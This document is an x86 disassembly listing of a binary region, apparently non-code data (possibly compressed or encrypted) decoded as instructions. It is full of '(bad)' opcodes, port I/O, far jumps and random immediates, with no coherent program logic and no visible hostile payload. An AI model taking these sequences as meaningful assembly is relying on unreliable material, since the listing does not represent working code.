  418c11:	xchg   edx,eax
  418c12:	adc    dl,BYTE PTR [ecx]
  418c14:	xchg   esp,eax
  418c15:	sbb    esi,esp
  418c17:	nop
  418c18:	fimul  WORD PTR [edi+esi*8+0x1f102dd2]
  418c1f:	mov    esp,0xa2da21e9
  418c24:	or     BYTE PTR [ebp+0x5e053a66],al
  418c2a:	(bad)  
  418c2b:	mov    ecx,0x676c12c0
  418c30:	in     al,0x28
  418c32:	out    dx,eax
  418c33:	adc    al,0x3d
	...
  418c95:	add    bl,bh
  418c97:	inc    edx
  418c98:	out    dx,al
  418c99:	aas    
  418c9a:	(bad)  
  418c9b:	mov    edi,0x9c1c6fb
  418ca0:	scas   al,BYTE PTR es:[edi]
  418ca1:	adc    edx,DWORD PTR [ebx+0x59790d4d]
  418ca7:	add    al,0x1
  418ca9:	add    BYTE PTR [edi],al
  418cab:	add    DWORD PTR [eax],eax
  418cad:	add    BYTE PTR [edi-0x96a4672],dh
  418cb3:	jecxz  0x418cf5
  418cb5:	mov    edi,0x84ff2769
  418cba:	(bad)  
  418cbb:	aaa    
  418cbc:	dec    ebx
  418cbd:	inc    DWORD PTR [eax+0x64]
  418cc0:	push   cs
  418cc1:	(bad)  
  418cc3:	pop    edx
  418cc4:	mov    fs,edi
  418cc6:	mov    al,ds:0x690b877f
  418ccb:	(bad)  
  418ccc:	into   
  418ccd:	mov    es,WORD PTR ds:0xfe3aa26f
  418cd3:	add    DWORD PTR [edx-0x36],ebx
  418cd6:	pop    ebp
  418cd7:	push   0x4b
  418cd9:	inc    esp
  418cda:	or     ch,ch
  418cdc:	in     eax,0xbe
  418cde:	in     eax,0x31
  418ce0:	in     al,dx
  418ce1:	fs cli 
  418ce3:	mov    al,ds:0xb2d63475
  418ce8:	add    DWORD PTR [esi],esi
  418cea:	loop   0x418c8b
  418cec:	cli    
  418ced:	pop    edi
  418cee:	xor    ebx,DWORD PTR [ebp+0x52]
  418cf1:	push   esi
  418cf2:	mov    ds:0x32ef5069,eax
  418cf7:	mov    ds:0xedee9af1,al
  418cfc:	pushf  
  418cfd:	pusha  
  418cfe:	inc    ecx
  418cff:	inc    esp
  418d00:	jecxz  0x418d5e
  418d02:	dec    esi
  418d03:	pop    ebp
  418d04:	xlat   BYTE PTR ds:[ebx]
  418d05:	cs cld 
  418d07:	sub    ah,al
  418d09:	rol    BYTE PTR es:[esp+eiz*4],1
  418d0d:	fninit 
  418d0f:	inc    ebp
  418d10:	add    al,0x6f
  418d12:	xlat   BYTE PTR ds:[ebx]
  418d13:	in     eax,dx
  418d14:	rol    BYTE PTR [ebp-0x13],cl
  418d17:	div    DWORD PTR [edx-0x2]
  418d1a:	pushf  
  418d1b:	repnz xchg ebp,eax
  418d1d:	cwde   
  418d1e:	mov    cs,WORD PTR [ecx]
  418d20:	dec    eax
  418d21:	xchg   edi,eax
  418d22:	(bad)  
  418d23:	add    ah,dl
  418d25:	les    esi,FWORD PTR [ebx-0x1d]
  418d28:	jg     0x418cde
  418d2a:	and    dl,bl
  418d2c:	push   ecx
  418d2d:	jbe    0x418d30
  418d2f:	aam    0xc0
  418d31:	xor    al,0x7c
  418d33:	retf   
  418d34:	xchg   ebp,eax
  418d35:	add    al,0x31
  418d37:	mul    BYTE PTR [ecx]
  418d39:	nop
  418d3a:	or     eax,0x4432e4ea
  418d3f:	arpl   sp,ax
  418d41:	pop    esi
  418d42:	xor    eax,DWORD PTR [ebp-0x44]
  418d45:	xchg   ebp,eax
  418d46:	and    ebx,ebx
  418d48:	add    eax,0x7fbf50ce
  418d4d:	inc    esp
  418d4e:	xchg   ebp,ecx
  418d50:	cmp    ecx,DWORD PTR [edi-0xb5857]
  418d56:	jmp    0x418ce3
  418d58:	fistp  DWORD PTR [ecx]
  418d5a:	push   0xffffffb2
  418d5c:	imul   edi,esp,0x4014c267
  418d62:	ret    0xf97
  418d65:	add    DWORD PTR [ecx+edi*8+0x9],ebx
  418d69:	inc    esp
  418d6a:	jecxz  0x418dd4
  418d6c:	pop    edx
  418d6d:	cmp    DWORD PTR [eax+ebx*8-0x5a],ebx
  418d71:	pusha  
  418d72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d73:	inc    esp
  418d74:	push   ecx
  418d75:	and    eax,0xa00f7566
  418d7a:	xor    edi,ebx
  418d7c:	mov    ch,ch
  418d7e:	inc    ebx
  418d7f:	enter  0x204,0x5e
  418d83:	adc    al,0x7e
  418d85:	in     eax,0x1d
  418d87:	stos   BYTE PTR es:[edi],al
  418d88:	arpl   bx,cx
  418d8a:	mov    dh,0x67
  418d8c:	aaa    
  418d8d:	pop    esi
  418d8e:	cs push esi
  418d90:	repnz mov ecx,0xd5dd8fb2
  418d96:	nop
  418d97:	ss stos BYTE PTR es:[edi],al
  418d99:	jae    0x418d78
  418d9b:	mov    esp,0xa0816ca4
  418da0:	test   al,0x87
  418da2:	aam    0x78
  418da4:	xor    bh,BYTE PTR [ebp+0x58feee46]
  418daa:	outs   dx,DWORD PTR ds:[esi]
  418dab:	cmp    al,0xbb
  418dad:	idiv   DWORD PTR [edx-0x61]
  418db0:	icebp  
  418db1:	fmul   DWORD PTR [esi+0x2f]
  418db4:	mov    ch,0x0
	...
  418e16:	push   cs
  418e17:	bnd call 0xde7c8a4d
  418e1d:	(bad)  
  418e1e:	jl     0x418e26
  418e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e21:	mov    al,ds:0x83955b9d
  418e26:	pusha  
  418e27:	add    eax,0x1070001
  418e2c:	add    BYTE PTR [eax],al
  418e2e:	sbb    DWORD PTR [edi+ecx*1+0x50],esi
  418e32:	lods   al,BYTE PTR ds:[esi]
  418e33:	mov    al,0x87
  418e35:	dec    esp
  418e36:	sub    ah,BYTE PTR [edi-0x47c703dd]
  418e3c:	hlt    
  418e3d:	addr16 push edx
  418e3f:	test   BYTE PTR [edi],bl
  418e41:	jbe    0x418e2b
  418e43:	sub    eax,0xc2ae2af
  418e48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e49:	sub    BYTE PTR [ebp-0x501b64c8],0x21
  418e50:	mov    edx,0xbe796620
  418e55:	inc    edx
  418e56:	ret    0x606e
  418e59:	outs   dx,DWORD PTR ds:[esi]
  418e5a:	out    dx,eax
  418e5b:	(bad)  
  418e5c:	pop    esi
  418e5d:	xchg   edx,eax
  418e5e:	hlt    
  418e5f:	ins    DWORD PTR es:[edi],dx
  418e60:	and    eax,esp
  418e62:	mov    WORD PTR fs:[esi+0x6e1a9d4b],es
  418e69:	dec    edx
  418e6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e6b:	mov    esp,edx
  418e6d:	mov    ah,0x25
  418e6f:	sub    BYTE PTR [edx+0x26],al
  418e72:	jle    0x418ea5
  418e74:	sahf   
  418e75:	aam    0xb2
  418e77:	jbe    0x418edf
  418e79:	mov    dl,0xdf
  418e7b:	fisub  DWORD PTR [ebp-0x4a]
  418e7e:	das    
  418e7f:	outs   dx,DWORD PTR ds:[esi]
  418e80:	jbe    0x418e08
  418e82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e83:	pop    ebx
  418e84:	xchg   ebp,ebx
  418e86:	add    al,0xbb
  418e88:	scas   al,BYTE PTR es:[edi]
  418e89:	jge    0x418e59
  418e8b:	jmp    0x3a62:0x9a547cf
  418e92:	and    al,0x71
  418e94:	add    bl,ah
  418e96:	sbb    ch,BYTE PTR [ecx]
  418e98:	dec    eax
  418e99:	addr16 dec esp
  418e9b:	ins    DWORD PTR es:[edi],dx
  418e9c:	jg     0x418e52
  418e9e:	add    DWORD PTR [ebx-0x57],ecx
  418ea1:	sub    eax,esi
  418ea3:	shl    DWORD PTR [edi+eax*1],0x8b
  418ea7:	mov    edi,0xc4bc97a
  418eac:	fs xchg edi,eax
  418eae:	sub    eax,ebx
  418eb0:	mov    ch,0xfc
  418eb2:	mov    cl,0xe8
  418eb4:	xlat   BYTE PTR ds:[ebx]
  418eb5:	sub    ah,BYTE PTR [esi+0x1e]
  418eb8:	fcmovnu st,st(7)
  418eba:	cmp    al,0xac
  418ebc:	cmp    bl,ah
  418ebe:	sar    BYTE PTR [ecx-0x59],cl
  418ec1:	jge    0x418e9c
  418ec3:	stos   DWORD PTR es:[edi],eax
  418ec4:	cwde   
  418ec5:	aad    0x9c
  418ec7:	ss stos DWORD PTR es:[edi],eax
  418ec9:	xor    ebp,DWORD PTR [ecx+0x42]
  418ecc:	mov    ah,BYTE PTR [eax+ebp*2+0x5be2d64f]
  418ed3:	mov    ebp,0xad2dc6ea
  418ed8:	aas    
  418ed9:	icebp  
  418eda:	pop    ebx
  418edb:	pop    eax
  418edc:	sbb    esp,DWORD PTR [ecx-0x78]
  418edf:	push   ss
  418ee0:	mov    dl,ah
  418ee2:	dec    ecx
  418ee3:	cs cwde 
  418ee5:	std    
  418ee6:	mov    al,ds:0xa551f441
  418eeb:	or     ebx,DWORD PTR [ebx+ebx*1-0x7c0a1900]
  418ef2:	xchg   edx,eax
  418ef3:	popa   
  418ef4:	jmp    0x418ecb
  418ef6:	stc    
  418ef7:	dec    ebp
  418ef8:	lea    ecx,[edi+0x78a6c78d]
  418efe:	idiv   DWORD PTR [edx-0x77]
  418f01:	push   esi
  418f02:	aas    
  418f03:	or     ah,ah
  418f05:	int    0x98
  418f07:	jo     0x418ec2
  418f09:	mov    esi,0xe588343f
  418f0e:	sub    eax,edi
  418f10:	xchg   ebp,eax
  418f11:	cmova  ecx,DWORD PTR [ebp+0x59]
  418f15:	bound  esp,QWORD PTR [eax-0x13c7a18d]
  418f1b:	hlt    
  418f1c:	fist   DWORD PTR [edi]
  418f1e:	push   ecx
  418f1f:	shr    DWORD PTR [edi-0x17949f82],cl
  418f25:	pop    edx
  418f26:	imul   edi,DWORD PTR [edx],0xbb938350
  418f2c:	mov    ah,0x6e
  418f2e:	mov    DWORD PTR [ecx+0x14],ebp
  418f31:	fs push eax
  418f33:	scas   eax,DWORD PTR es:[edi]
  418f34:	pop    ebx
	...
  418f95:	add    BYTE PTR [edi+edx*4],bl
  418f98:	in     al,0x47
  418f9a:	out    dx,eax
  418f9b:	ja     0x418f5c
  418f9d:	fist   WORD PTR [ebp+0x2f7adcb2]
  418fa3:	cld    
  418fa4:	push   edi
  418fa5:	cld    
  418fa6:	addr16 push es
  418fa8:	add    DWORD PTR [eax],eax
  418faa:	pop    es
  418fab:	add    DWORD PTR [eax],eax
  418fad:	add    BYTE PTR [ebx-0x6d4a0514],bl
  418fb3:	pop    esi
  418fb4:	inc    edx
  418fb5:	push   ds
  418fb6:	pop    esp
  418fb7:	xor    al,0x7b
  418fb9:	sbb    al,0x5d
  418fbb:	push   edx
  418fbc:	jo     0x418f4b
  418fbe:	and    DWORD PTR fs:[eax-0x14],0x1ad51f82
  418fc6:	xor    dl,BYTE PTR [ebx-0x2db832cb]
  418fcc:	sub    eax,0x6026b019
  418fd1:	inc    eax
  418fd2:	mov    eax,ds:0xf9f6d632
  418fd7:	push   es
  418fd8:	inc    esi
  418fd9:	add    ebp,DWORD PTR [edi+0x49]
  418fdc:	jno    0x419020
  418fde:	inc    ebp
  418fdf:	bound  ecx,QWORD PTR [ecx-0x4a]
  418fe2:	push   ebp
  418fe3:	dec    ebp
  418fe4:	add    esi,DWORD PTR [edx+0x6f15ad13]
  418fea:	ret    0x5a42
  418fed:	inc    ebp
  418fee:	pop    esi
  418fef:	shl    BYTE PTR ds:[eax-0x29],cl
  418ff3:	ss sbb dh,bl
  418ff6:	push   ds
  418ff7:	popa   
  418ff8:	jle    0x418fc7
  418ffa:	sbb    DWORD PTR [ecx],edi
  418ffc:	arpl   cx,bp
  418ffe:	or     ebx,DWORD PTR [esi-0x25ca266d]
  419004:	add    BYTE PTR [esi-0x7368f22e],ah
  41900a:	jg     0x418fdc
  41900c:	sub    al,0xf0
  41900e:	das    
  41900f:	dec    edx
  419010:	imul   ebx,DWORD PTR [eax],0xffffff86
  419013:	jno    0x418feb
  419015:	hlt    
  419016:	rcl    eax,cl
  419018:	fwait
  419019:	js     0x418fc9
  41901b:	jb     0x41903c
  41901d:	nop
  41901e:	cmp    bh,BYTE PTR [ebp+0x5adcc099]
  419024:	imul   esp,ecx,0xb751e6c7
  41902a:	xchg   esi,eax
  41902b:	add    eax,0xd97370f3
  419030:	shl    BYTE PTR [eax-0xd89a1fa],1
  419036:	mov    ds:0xa2fd3fc2,al
  41903b:	(bad)  
  41903c:	adc    al,BYTE PTR [esi-0x3f]
  41903f:	retf   
  419040:	call   0xc47fa09a
  419045:	jne    0x419066
  419047:	push   edi
  419048:	mov    DWORD PTR [ecx],esp
  41904a:	outs   dx,BYTE PTR ds:[esi]
  41904b:	sbb    eax,ebp
  41904d:	cs popa 
  41904f:	xor    ebx,edi
  419051:	loop   0x419033
  419053:	sbb    eax,DWORD PTR [ebx+0x21c2e0f9]
  419059:	in     eax,dx
  41905a:	(bad)  
  41905c:	adc    eax,0x77698a6b
  419061:	cld    
  419062:	jl     0x419016
  419064:	jb     0x41906a
  419066:	repnz inc eax
  419068:	push   0xc8d1038b
  41906d:	cmp    BYTE PTR [esp+ebp*2],al
  419070:	ja     0x4190d1
  419072:	div    DWORD PTR [edi-0x1cee0f13]
  419078:	jnp    0x4190c1
  41907a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41907b:	or     ecx,DWORD PTR [esi+0x18]
  41907e:	and    al,0xc
  419080:	sub    DWORD PTR [eax],edi
  419082:	(bad)  
  419083:	leave  
  419084:	and    ah,BYTE PTR [ebx-0x2a]
  419087:	jne    0x4190ab
  419089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41908a:	leave  
  41908b:	stos   DWORD PTR es:[edi],eax
  41908c:	shl    edx,0xa2
  41908f:	ficomp WORD PTR [ecx+eiz*1-0x65b81702]
  419096:	sbb    al,0xf6
  419098:	mov    bh,0x9a
  41909a:	in     eax,dx
  41909b:	dec    ebx
  41909c:	retf   
  41909d:	adc    dh,BYTE PTR [edi-0x7d]
  4190a0:	xchg   BYTE PTR [ebx],dh
  4190a2:	or     ah,BYTE PTR [esi]
  4190a4:	lock adc eax,0x5b6ed40d
  4190aa:	lds    esi,FWORD PTR [edx]
  4190ac:	and    al,bh
  4190ae:	dec    ecx
  4190af:	sub    DWORD PTR [esp+ebx*2+0xa67eaf],0x0
	...
  419113:	add    BYTE PTR [eax],al
  419115:	add    BYTE PTR [edi-0x41bd617b],ch
  41911b:	pop    ebx
  41911c:	(bad)  
  41911d:	in     eax,dx
  41911e:	daa    
  41911f:	jle    0x4190b5
  419121:	add    edx,DWORD PTR [ebp+0x6eb4be68]
  419127:	pop    es
  419128:	add    DWORD PTR [eax],eax
  41912a:	pop    es
  41912b:	add    DWORD PTR [eax],eax
  41912d:	add    BYTE PTR [ecx],ch
  41912f:	into   
  419130:	xchg   esp,eax
  419131:	cmc    
  419132:	jle    0x419140
  419134:	das    
  419135:	mov    WORD PTR [ebp+0xe],ds
  419138:	mov    dh,0x2a
  41913a:	out    0x3,eax
  41913c:	test   DWORD PTR [edx],edi
  41913e:	cli    
  41913f:	pop    ss
  419140:	pop    ecx
  419141:	mov    BYTE PTR [edx-0x3247d387],ah
  419147:	push   ss
  419148:	pop    edi
  419149:	adc    al,0xe2
  41914b:	dec    esi
  41914c:	pusha  
  41914d:	je     0x4190de
  41914f:	jae    0x419159
  419151:	fld    QWORD PTR [bx+si]
  419154:	pop    eax
  419155:	(bad)  
  419156:	cmp    eax,0x9ac406b2
  41915b:	retf   0xc7fe
  41915e:	les    esp,FWORD PTR [edi+0x6808097c]
  419164:	fist   WORD PTR [edi+ebp*4]
  419167:	cs add edx,edx
  41916a:	sub    al,0x47
  41916c:	ja     0x419108
  41916e:	xchg   ebx,eax
  41916f:	sbb    cl,ch
  419171:	mov    dh,0xd5
  419173:	adc    eax,0xaf1303fa
  419178:	jne    0x4191bf
  41917a:	xchg   ecx,eax
  41917b:	add    BYTE PTR [ecx-0x34],ch
  41917e:	shl    dl,0x14
  419181:	ins    BYTE PTR es:[edi],dx
  419182:	mov    al,0x67
  419184:	adc    al,0x8e
  419186:	shl    DWORD PTR [eax+0x2822f7b9],0x31
  41918d:	sbb    BYTE PTR [ebx-0x6f],al
  419190:	inc    esi
  419191:	push   0xd2eb23c7
  419196:	xor    esp,DWORD PTR [edx]
  419198:	jbe    0x419214
  41919a:	lahf   
  41919b:	and    al,0xc8
  41919d:	dec    ebx
  41919e:	push   esp
  41919f:	sub    bl,cl
  4191a1:	xchg   edi,eax
  4191a2:	scas   eax,DWORD PTR es:[edi]
  4191a3:	xor    eax,0x82c67270
  4191a8:	iret   
  4191a9:	jno    0x41921b
  4191ab:	lea    ecx,[ebx-0x5b]
  4191ae:	pop    edi
  4191af:	shl    BYTE PTR [esi+eax*8-0x75eab8c0],cl
  4191b6:	(bad)  
  4191b7:	push   esi
  4191b8:	or     al,0x43
  4191ba:	cmp    DWORD PTR [ecx+0x62],0x6f
  4191be:	pop    ebx
  4191bf:	ss push ebx
  4191c1:	xchg   esp,eax
  4191c2:	(bad)  
  4191c3:	popa   
  4191c4:	ror    DWORD PTR [ebp+0x7d],0xca
  4191c8:	bound  ebx,QWORD PTR [ebp+0x48]
  4191cb:	sbb    eax,0x37e7a1d6
  4191d0:	cdq    
  4191d1:	xchg   ecx,eax
  4191d2:	mov    WORD PTR [eax-0x530583e9],cs
  4191d8:	add    eax,0xea0024cc
  4191dd:	xchg   BYTE PTR [ecx-0x6696b4d1],ah
  4191e3:	shl    DWORD PTR [edx+eax*2],cl
  4191e6:	shl    DWORD PTR [esi],cl
  4191e8:	push   ds
  4191e9:	inc    esi
  4191ea:	pop    edx
  4191eb:	dec    ebx
  4191ec:	jmp    0xd948:0x70a6a191
  4191f3:	stc    
  4191f4:	mov    al,ds:0x6ba784b2
  4191f9:	popfw  
  4191fb:	mov    dh,0xb5
  4191fd:	out    dx,al
  4191fe:	mov    dl,al
  419200:	jmp    0x5f89bfb7
  419205:	mov    edx,0xd8945df0
  41920a:	xor    ch,BYTE PTR [eax-0xb]
  41920d:	mov    ds:0x1a0bee5b,eax
  419212:	in     eax,0xd8
  419214:	das    
  419215:	es push es
  419217:	inc    ecx
  419218:	not    DWORD PTR [eax+0x19e483de]
  41921e:	mov    ebx,0xb4fea10b
  419223:	xor    al,0x99
  419225:	aas    
  419226:	inc    edx
  419227:	adc    ch,BYTE PTR [esi-0x20057451]
  41922d:	in     eax,0x1
  41922f:	in     al,dx
  419230:	sub    ebp,edx
  419232:	push   es
  419233:	push   0x35
	...
  419294:	add    BYTE PTR [eax],al
  419296:	mov    al,ds:0xff33bae7
  41929b:	jg     0x419246
  41929d:	idiv   DWORD PTR [edi+ebx*2]
  4192a0:	mov    esp,0xa9f0b54f
  4192a5:	lahf   
  4192a6:	jne    0x4192b0
  4192a8:	add    DWORD PTR [eax],eax
  4192aa:	pop    es
  4192ab:	add    DWORD PTR [eax],eax
  4192ad:	add    BYTE PTR [edi-0x4fc241f7],cl
  4192b3:	push   cs
  4192b4:	or     al,0x33
  4192b6:	test   al,0xcc
  4192b8:	dec    ebp
  4192b9:	(bad)  
  4192ba:	shl    BYTE PTR [ebx],cl
  4192bc:	add    BYTE PTR [edx-0x3a],dl
  4192bf:	jns    0x419249
  4192c1:	xor    cl,BYTE PTR [ecx+0x3da9e93d]
  4192c7:	dec    edi
  4192c8:	test   eax,0xd95a43d9
  4192cd:	dec    esp
  4192ce:	lea    eax,[eax-0x2d]
  4192d1:	add    eax,0x2a3a7294
  4192d6:	mov    dh,0x34
  4192d8:	adc    DWORD PTR [ecx+0x6acca6f6],edx
  4192de:	mov    eax,ds:0xd9e2c8df
  4192e3:	call   0x4fa:0x1f336182
  4192ea:	pusha  
  4192eb:	(bad)  
  4192ed:	out    dx,al
  4192ee:	fdivr  QWORD PTR [ecx-0x2947162e]
  4192f4:	(bad)  
  4192f5:	sub    ch,cl
  4192f7:	pop    ecx
  4192f8:	into   
  4192f9:	mov    edi,DWORD PTR [eax-0x4c]
  4192fc:	and    al,0xb4
  4192fe:	xchg   ebx,eax
  4192ff:	stos   DWORD PTR es:[edi],eax
  419300:	aas    
  419301:	ret    0x9a13
  419304:	dec    esi
  419305:	sbb    ebp,DWORD PTR [eax-0x360be432]
  41930b:	ja     0x419357
  41930d:	xchg   esp,eax
  41930e:	jno    0x419336
  419310:	pop    ebx
  419311:	cdq    
  419312:	adc    ebp,ecx
  419314:	in     eax,0xd8
  419316:	data16 xlat BYTE PTR ds:[ebx]
  419318:	hlt    
  419319:	sub    esi,DWORD PTR [eax-0x5a]
  41931c:	imul   edi,edx,0xf3c84fef
  419322:	cmp    ebp,ebx
  419324:	pushf  
  419325:	cmp    dh,ch
  419327:	pop    ebp
  419328:	in     eax,dx
  419329:	cmp    DWORD PTR [esi-0x26],esi
  41932c:	dec    ebp
  41932d:	test   BYTE PTR ds:0x88a2e21f,cl
  419333:	call   0x3de6:0x1fb3c1f5
  41933a:	jecxz  0x4192d3
  41933c:	stos   BYTE PTR es:[edi],al
  41933d:	call   0x9568874b
  419342:	push   ecx
  419343:	cmp    BYTE PTR [edx+0xf],cl
  419346:	adc    al,BYTE PTR [ebx]
  419348:	outs   dx,BYTE PTR ds:[esi]
  419349:	xchg   edi,eax
  41934a:	ins    BYTE PTR es:[edi],dx
  41934b:	inc    ebp
  41934c:	test   cl,bl
  41934e:	inc    ecx
  41934f:	call   0xde3b251b
  419354:	jno    0x41935e
  419356:	adc    eax,DWORD PTR [esi-0x50]
  419359:	inc    edx
  41935a:	inc    edi
  41935b:	lahf   
  41935c:	push   edi
  41935d:	std    
  41935e:	rcr    DWORD PTR [ecx+ebp*1-0x16ed35df],cl
  419365:	jbe    0x41932d
  419367:	or     ebx,DWORD PTR [ebx+0x30]
  41936a:	call   0xf0aa:0x8263c1c3
  419371:	push   ecx
  419372:	add    al,0x26
  419374:	xlat   BYTE PTR ds:[ebx]
  419375:	in     eax,0x4e
  419377:	inc    ecx
  419378:	les    edx,FWORD PTR [esi-0x36]
  41937b:	jecxz  0x419338
  41937d:	mov    ch,BYTE PTR [edx-0x7b]
  419380:	push   es
  419381:	loopne 0x4193ff
  419383:	stos   BYTE PTR es:[edi],al
  419384:	idiv   DWORD PTR [ecx+0x21fa1282]
  41938a:	sbb    ebx,ebp
  41938c:	lods   al,BYTE PTR ds:[esi]
  41938d:	sahf   
  41938e:	shl    DWORD PTR [ebx+0x16bedc82],0xda
  419395:	xchg   edi,eax
  419396:	adc    bl,ch
  419398:	sbb    al,0x11
  41939a:	push   edi
  41939b:	push   eax
  41939c:	inc    DWORD PTR [edx-0x1d]
  41939f:	lock pusha 
  4193a1:	mov    ch,0x81
  4193a3:	das    
  4193a4:	pop    ds
  4193a5:	sub    edx,DWORD PTR [edx]
  4193a7:	push   ss
  4193a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193a9:	pop    ecx
  4193aa:	pop    eax
  4193ab:	and    DWORD PTR [edi+edx*1-0x577177f9],esi
  4193b2:	dec    eax
  4193b3:	test   eax,0x9f
	...
  419414:	add    BYTE PTR [eax],al
  419416:	cmp    eax,0xed3a6998
  41941b:	sti    
  41941c:	jg     0x4193bd
  41941e:	les    ecx,FWORD PTR [ebp+ebp*8-0x1b1782c9]
  419425:	hlt    
  419426:	jl     0x419431
  419428:	add    DWORD PTR [eax],eax
  41942a:	pop    es
  41942b:	add    DWORD PTR [eax],eax
  41942d:	add    BYTE PTR [edx+0x63b3edb4],bl
  419433:	lahf   
  419434:	or     BYTE PTR [esi-0x484e5bab],bl
  41943a:	cmp    al,bh
  41943c:	jo     0x419406
  41943e:	fild   DWORD PTR [ebp+0x6c998d]
  419444:	stos   BYTE PTR es:[edi],al
  419445:	outs   dx,BYTE PTR ds:[esi]
  419446:	out    dx,al
  419447:	gs xchg esp,eax
  419449:	and    eax,0x2fddab31
  41944e:	mov    edx,0xd01c4016
  419453:	add    DWORD PTR [ebp-0x1d],0x19f8d257
  41945a:	ror    DWORD PTR [ebp+edi*2-0x13eeb22e],0xe0
  419462:	mov    edx,0xd16d3ff
  419467:	or     eax,0x135f7789
  41946c:	vminps ymm4,ymm1,YMMWORD PTR [eax+edx*8]
  419472:	and    ecx,ebx
  419474:	add    esp,esp
  419476:	(bad)  
  419477:	push   eax
  419478:	mov    edx,0x84887c32
  41947d:	xor    BYTE PTR [ebp+0x6849931a],al
  419483:	test   al,0x6b
  419485:	data16 mov WORD PTR [edx],ds
  419488:	push   ebp
  419489:	jno    0x419423
  41948b:	in     al,0xf3
  41948d:	pop    ecx
  41948e:	mov    cl,0x18
  419490:	push   edi
  419491:	sub    DWORD PTR [ecx-0x17],0x7a
  419495:	or     al,0x42
  419497:	test   al,0x1b
  419499:	rol    ebp,1
  41949b:	js     0x419494
  41949d:	mov    edx,0xffcaaecb
  4194a2:	cmp    eax,0xd31be82e
  4194a7:	dec    edi
  4194a8:	pop    es
  4194a9:	cli    
  4194aa:	cmp    cl,BYTE PTR [edi+ecx*1-0x1f]
  4194ae:	mov    ds:0xf7ab224e,eax
  4194b3:	cmp    al,al
  4194b5:	(bad)  
  4194b6:	pop    ecx
  4194b7:	mov    DWORD PTR [eax+0xb174b5d],0xb601ddf4
  4194c1:	adc    dh,dl
  4194c3:	pop    es
  4194c4:	push   ebp
  4194c5:	aam    0x1d
  4194c7:	and    al,0x6d
  4194c9:	jg     0x41951e
  4194cb:	lods   al,BYTE PTR ds:[esi]
  4194cc:	(bad)  [ebp+0x53]
  4194cf:	mov    ds:0x22b282a,eax
  4194d4:	clc    
  4194d5:	in     eax,dx
  4194d6:	add    ebp,0x5ca53b3f
  4194dc:	call   0x3a56d8d5
  4194e1:	mov    bl,0xa8
  4194e3:	mov    al,ds:0xdc80fbe3
  4194e8:	sub    DWORD PTR [edx-0x1a4338ca],edi
  4194ee:	xchg   ebx,eax
  4194ef:	cmp    ah,0xe4
  4194f2:	loop   0x4194cf
  4194f4:	dec    edx
  4194f5:	sub    eax,0xa8ae4601
  4194fa:	shl    ah,1
  4194fc:	sahf   
  4194fd:	inc    edx
  4194fe:	int    0x9e
  419500:	mov    esp,0xc0768403
  419505:	popa   
  419506:	in     al,dx
  419507:	leave  
  419508:	xlat   BYTE PTR ds:[ebx]
  419509:	popf   
  41950a:	jae    0x41949a
  41950c:	mov    esi,0xf097620c
  419511:	(bad)  
  419512:	mov    esp,0x32b8548f
  419517:	(bad)  
  419518:	mov    dh,0x53
  41951a:	shl    esi,0x2c
  41951d:	rcr    DWORD PTR [edx],cl
  41951f:	push   ss
  419520:	repz mov dl,0xf9
  419523:	cmp    edi,DWORD PTR [ecx+0x5954e9eb]
  419529:	lds    ecx,FWORD PTR [eax+0x42]
  41952c:	cmp    BYTE PTR [eax-0x65610a1d],ah
  419532:	xor    al,0xfe
  419534:	xchg   esp,eax
	...
  419595:	add    BYTE PTR [edi-0x9d722c],ch
  41959b:	jnp    0x41958c
  41959d:	fnsave [ebx-0xf]
  4195a0:	xchg   esi,eax
  4195a1:	neg    BYTE PTR [ecx+0x71]
  4195a4:	fcomp  QWORD PTR [ebx-0x7d]
  4195a7:	or     al,BYTE PTR [ecx]
  4195a9:	add    BYTE PTR [edi],al
  4195ab:	add    DWORD PTR [eax],eax
  4195ad:	add    BYTE PTR [eax+0x1169529e],al
  4195b3:	mov    al,ds:0x7801c100
  4195b8:	cli    
  4195b9:	xchg   esp,eax
  4195ba:	into   
  4195bb:	add    eax,0x41eccc59
  4195c0:	jg     0x4195c5
  4195c2:	xchg   DWORD PTR [ebx+0x7a7ea9fe],eax
  4195c8:	repz add edi,ebx
  4195cb:	mov    edx,0x89c5b542
  4195d0:	iret   
  4195d1:	xchg   BYTE PTR [ebx],ch
  4195d3:	cdq    
  4195d4:	outs   dx,DWORD PTR ds:[esi]
  4195d5:	push   eax
  4195d6:	and    al,0xb9
  4195d8:	(bad)  
  4195d9:	iret   
  4195da:	(bad)  
  4195db:	ss sbb ch,dh
  4195de:	add    ebp,DWORD PTR [ebx+0x4c]
  4195e1:	sub    bh,bh
  4195e3:	mov    edi,DWORD PTR [esi+0x665ecdd1]
  4195e9:	or     esp,edi
  4195eb:	mov    ds:0x2c49c322,al
  4195f0:	cmp    ebx,DWORD PTR [esi+0x56e2a22e]
  4195f6:	fwait
  4195f7:	in     eax,dx
  4195f8:	xchg   esi,eax
  4195f9:	pop    es
  4195fa:	aaa    
  4195fb:	push   edi
  4195fc:	fwait
  4195fd:	int3   
  4195fe:	mov    esi,fs
  419600:	call   FWORD PTR [esi+0x6e65b3f7]
  419606:	sahf   
  419607:	inc    ebp
  419608:	or     DWORD PTR [esi+0x49],esp
  41960b:	mov    bh,0x4d
  41960d:	mov    dl,0x3a
  41960f:	js     0x4195ed
  419611:	jb     0x419664
  419613:	outs   dx,DWORD PTR ds:[esi]
  419614:	sub    DWORD PTR [esi-0x5ff20972],esi
  41961a:	test   al,0xd9
  41961c:	test   eax,0xe0a6fa2f
  419621:	sub    eax,0xfd580305
  419626:	mov    dl,0xc7
  419628:	in     al,dx
  419629:	ja     0x41969a
  41962b:	rcr    bl,0xfd
  41962e:	adc    ebx,DWORD PTR [eax+0x7b]
  419631:	cmp    eax,0xf08ba659
  419636:	add    DWORD PTR [edi],edi
  419638:	mov    dh,0x52
  41963a:	or     eax,0x48398b1d
  41963f:	jae    0x419656
  419641:	mov    ch,0x76
  419643:	lods   al,BYTE PTR ds:[esi]
  419644:	je     0x419626
  419646:	lahf   
  419647:	outs   dx,BYTE PTR ds:[esi]
  419648:	cmc    
  419649:	and    eax,ebx
  41964b:	mov    DWORD PTR [edi],ebp
  41964d:	adc    bl,dh
